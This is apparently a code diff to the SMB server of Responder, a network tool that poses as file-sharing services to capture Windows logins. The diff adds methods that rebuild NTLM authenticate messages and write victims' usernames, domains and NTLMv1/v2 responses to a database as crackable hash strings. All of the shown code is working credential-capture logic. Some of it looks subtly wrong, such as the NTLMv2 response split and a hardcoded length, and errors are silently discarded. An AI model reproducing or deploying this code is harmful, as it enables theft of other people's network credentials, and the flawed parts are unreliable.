@@ -398,32 +398,21 @@ class ResponderSMBServer(SimpleSMBServer):
 			# Get client IP from connection data
 			client_ip = connData.get('ClientIP', 'unknown')
 			
-			# Extract credentials from connection data if available
-			lmhash = connData.get('lmhash', None)
-			nthash = connData.get('nthash', None)
-			
-			if lmhash and nthash:
-				# Parse and save the hash
-				if len(nthash) == 24:  # NTLMv1
-					WriteHash = '%s::%s:%s:%s:%s' % (user_name, domain_name, lmhash.hex().upper(), nthash.hex().upper(), settings.Config.Challenge.hex().upper())
-					SaveToDb({
-						'module': 'SMB', 
-						'type': 'NTLMv1-SSP', 
-						'client': client_ip, 
-						'user': domain_name+'\\'+user_name, 
-						'hash': nthash.hex().upper(), 
-						'fullhash': WriteHash,
-					})
-				else:  # NTLMv2
-					WriteHash = '%s::%s:%s:%s:%s' % (user_name, domain_name, settings.Config.Challenge.hex().upper(), nthash[:32].hex().upper(), nthash[32:].hex().upper())
-					SaveToDb({
-						'module': 'SMB', 
-						'type': 'NTLMv2-SSP', 
-						'client': client_ip, 
-						'user': domain_name+'\\'+user_name, 
-						'hash': nthash.hex().upper(), 
-						'fullhash': WriteHash,
-					})
+			# Check if we have the authenticate message with NTLM data
+			if 'AUTHENTICATE_MESSAGE' in connData:
+				auth_msg = connData['AUTHENTICATE_MESSAGE']
+				challenge_msg = connData.get('CHALLENGE_MESSAGE', None)
+				
+				# Extract NTLM data from impacket's parsed objects
+				try:
+					# Reconstruct the NTLM data in the format ParseSMBHash expects
+					ntlm_data = self._reconstruct_ntlm_data(auth_msg, challenge_msg)
+					if ntlm_data:
+						# Use Responder's challenge instead of impacket's
+						ParseSMBHash(ntlm_data, client_ip, settings.Config.Challenge)
+				except Exception as e:
+					# Fallback to direct extraction if reconstruction fails
+					self._extract_ntlm_direct(auth_msg, client_ip)
 			
 			# Return appropriate error code based on settings
 			if settings.Config.ErrorCode:
@@ -435,6 +424,112 @@ class ResponderSMBServer(SimpleSMBServer):
 		
 		# Add default shares (IPC$ is created automatically by SimpleSMBServer)
 		self.addShare('C$', '/tmp')
+	
+	def _reconstruct_ntlm_data(self, auth_msg, challenge_msg):
+		"""Reconstruct NTLM data in the format ParseSMBHash expects"""
+		try:
+			# Start with NTLMSSP signature
+			ntlm_data = b'NTLMSSP\x00'
+			
+			# Add message type (0x03 for AUTHENTICATE_MESSAGE)
+			ntlm_data += b'\x03\x00\x00\x00'
+			
+			# Add LM Response length and offset
+			lm_response = auth_msg['lanman']
+			ntlm_data += struct.pack('<H', len(lm_response))  # LM Response Len
+			ntlm_data += struct.pack('<H', 64)  # LM Response Max Len
+			ntlm_data += struct.pack('<L', 64)  # LM Response Offset
+			
+			# Add NT Response length and offset
+			nt_response = auth_msg['ntlm']
+			ntlm_data += struct.pack('<H', len(nt_response))  # NT Response Len
+			ntlm_data += struct.pack('<H', len(nt_response))  # NT Response Max Len
+			ntlm_data += struct.pack('<L', 64 + len(lm_response))  # NT Response Offset
+			
+			# Add Domain Name length and offset
+			domain_name = auth_msg['domain_name']
+			ntlm_data += struct.pack('<H', len(domain_name))  # Domain Name Len
+			ntlm_data += struct.pack('<H', len(domain_name))  # Domain Name Max Len
+			ntlm_data += struct.pack('<L', 64 + len(lm_response) + len(nt_response))  # Domain Name Offset
+			
+			# Add User Name length and offset
+			user_name = auth_msg['user_name']
+			ntlm_data += struct.pack('<H', len(user_name))  # User Name Len
+			ntlm_data += struct.pack('<H', len(user_name))  # User Name Max Len
+			ntlm_data += struct.pack('<L', 64 + len(lm_response) + len(nt_response) + len(domain_name))  # User Name Offset
+			
+			# Add Host Name length and offset
+			host_name = auth_msg['host_name']
+			ntlm_data += struct.pack('<H', len(host_name))  # Host Name Len
+			ntlm_data += struct.pack('<H', len(host_name))  # Host Name Max Len
+			ntlm_data += struct.pack('<L', 64 + len(lm_response) + len(nt_response) + len(domain_name) + len(user_name))  # Host Name Offset
+			
+			# Add Session Key length and offset (if present)
+			session_key = auth_msg.get('session_key', b'')
+			ntlm_data += struct.pack('<H', len(session_key))  # Session Key Len
+			ntlm_data += struct.pack('<H', len(session_key))  # Session Key Max Len
+			ntlm_data += struct.pack('<L', 64 + len(lm_response) + len(nt_response) + len(domain_name) + len(user_name) + len(host_name))  # Session Key Offset
+			
+			# Add flags
+			ntlm_data += struct.pack('<L', auth_msg['flags'])
+			
+			# Add the actual data
+			ntlm_data += lm_response
+			ntlm_data += nt_response
+			ntlm_data += domain_name
+			ntlm_data += user_name
+			ntlm_data += host_name
+			ntlm_data += session_key
+			
+			return ntlm_data
+		except Exception as e:
+			return None
+	
+	def _extract_ntlm_direct(self, auth_msg, client_ip):
+		"""Extract NTLM data directly from impacket's parsed objects"""
+		try:
+			domain_name = auth_msg['domain_name'].decode('utf-16le')
+			user_name = auth_msg['user_name'].decode('utf-16le')
+			host_name = auth_msg['host_name'].decode('utf-16le')
+			
+			lm_response = auth_msg['lanman']
+			nt_response = auth_msg['ntlm']
+			
+			# Determine hash type based on NT response length
+			if len(nt_response) == 24:  # NTLMv1
+				WriteHash = '%s::%s:%s:%s:%s' % (
+					user_name, 
+					domain_name, 
+					lm_response.hex().upper(), 
+					nt_response.hex().upper(), 
+					settings.Config.Challenge.hex().upper()
+				)
+				SaveToDb({
+					'module': 'SMB', 
+					'type': 'NTLMv1-SSP', 
+					'client': client_ip, 
+					'user': domain_name+'\\'+user_name, 
+					'hash': nt_response.hex().upper(), 
+					'fullhash': WriteHash,
+				})
+			else:  # NTLMv2
+				WriteHash = '%s::%s:%s:%s:%s' % (
+					user_name, 
+					domain_name, 
+					settings.Config.Challenge.hex().upper(), 
+					nt_response[:32].hex().upper(), 
+					nt_response[32:].hex().upper()
+				)
+				SaveToDb({
+					'module': 'SMB', 
+					'type': 'NTLMv2-SSP', 
+					'client': client_ip, 
+					'user': domain_name+'\\'+user_name, 
+					'hash': nt_response.hex().upper(), 
+					'fullhash': WriteHash,
+				})
+		except Exception as e:
+			pass
 
 def serve_smb2_server(host, port):
 	"""Function to serve SMBv2 server using impacket"""
